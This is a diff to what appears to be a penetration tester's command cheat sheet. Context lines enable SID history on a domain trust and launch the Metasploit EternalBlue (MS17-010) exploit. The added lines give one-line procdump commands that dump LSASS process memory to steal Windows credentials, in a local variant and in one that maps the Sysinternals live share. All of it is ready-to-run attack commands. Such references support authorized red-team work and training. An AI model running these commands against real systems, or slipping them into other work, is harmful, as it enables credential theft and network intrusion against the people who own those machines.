@@ -315,3 +315,11 @@ netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
 % windows, cve
 # windows eternal blue - smb - ms17-010 
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue" 
+
+% procdump, lsass, credentials
+
+# procdump - dump lsass - local
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+
+# procdump - dump lsass - remote
+net use Z: https://live.sysinternals.com; Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
